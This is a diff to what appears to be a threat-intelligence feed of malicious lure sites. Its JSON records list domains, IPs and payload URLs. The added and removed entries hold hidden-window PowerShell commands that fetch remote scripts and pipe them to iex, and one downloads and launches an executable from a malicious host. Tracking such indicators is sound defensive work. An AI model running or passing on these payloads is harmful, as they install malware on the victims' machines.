@@ -1,5 +1,37 @@
 [
   {
+    "UrlDomain": "167-148-195-171.sslip.io",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://167-148-195-171.sslip.io/r.php?t=nywqcwqayp"
+    ],
+    "IP": [
+      "167.148.195.171"
+    ],
+    "Related": [],
+    "Payload": "POWerShELL -WindowStyle Hidden  -c \\\"irm https:\\/\\/167-148-195-171[.]sslip[.]io\\/r.php?t=nywqcwqayp|iex\\\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwgvo49e0m0j0omlaaon818w",
+    "ScannedAt": "2026-11-14T20:48:16.855000+00:00"
+  },
+  {
+    "UrlDomain": "kekman.space",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://kekman.space/verify.exe"
+    ],
+    "IP": [
+      "216.198.79.1"
+    ],
+    "Related": [],
+    "Payload": "powershell -w h -c \"iwr https://kekman[.]space/verify.exe -OutFile $env:TEMP\\a.exe;start $env:TEMP\\a.exe\"",
+    "ResolvedDownloadUrl": [
+      "https://kekman.space/verify.exe"
+    ],
+    "ReportId": "cmwgvo0m00m050omlpv3izxoy",
+    "ScannedAt": "2026-11-14T20:48:12.105000+00:00"
+  },
+  {
     "UrlDomain": "dekingsproject.com",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -9191,27 +9223,5 @@
     ],
     "ReportId": "cmw9s0e8w050u0oml3hvppp7a",
     "ScannedAt": "2026-11-09T21:31:27.980000+00:00"
-  },
-  {
-    "UrlDomain": "bergiedigital.com",
-    "DeliveryUrl": [
-      "copiose.org",
-      "sky.dolcefantasia.us",
-      "yaponovosh.org",
-      "cloudeccentric.cc"
-    ],
-    "PayloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "IP": [
-      "160.153.0.24"
-    ],
-    "Related": [],
-    "Payload": "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
-    "ResolvedDownloadUrl": [
-      "https://copiose.org/lom/62a9405c9735a1a7"
-    ],
-    "ReportId": "cmw9qc8do03h30omlv9zigk19",
-    "ScannedAt": "2026-11-09T20:44:40.970000+00:00"
   }
 ]
